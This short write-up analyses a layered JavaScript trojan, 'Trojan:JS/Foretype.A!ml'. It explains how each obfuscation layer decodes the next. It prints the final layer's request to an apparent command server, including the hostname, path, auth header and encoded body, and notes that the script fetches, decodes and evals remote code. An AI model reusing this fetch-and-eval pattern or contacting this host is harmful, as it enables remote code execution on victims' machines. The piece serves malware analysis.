
## `Intro`
Found a weird javascript "virus" tagged "Trojan:JS/Foretype.A!ml" and removed the layers to understand what it does.

### `layers`
the script it a scripted wrapped 3 times until you get to the part that fetches a payload from a server to run

#### `layer 1`
uses a key to decode a string into a second script

#### `layer 2`
uses the current script + the decoding script to generate a key used to decode the next layer

#### `layer 3`
calls a server with this kind of payload
~~~javascript
{
    method: 'POST',
    hostname: '30fcb676.phpmyadmin.greentechsupply.us',
    path: '/blank.gif',
    headers: {
        authHeader: 'e723846d2b596f0b',
        'Content-type': 'application/x-www-form-urlencoded'
    }
}
~~~~
With a body
~~~javascript
'a=d35e6e636a6d3f3a3b383a38786f636b6e66786c636f6b6d696d686a686a6d696a6778'
~~~~

after that it gets a script from the server decodes it and evals the output code


This is where it stops as the server doesn't respond with anything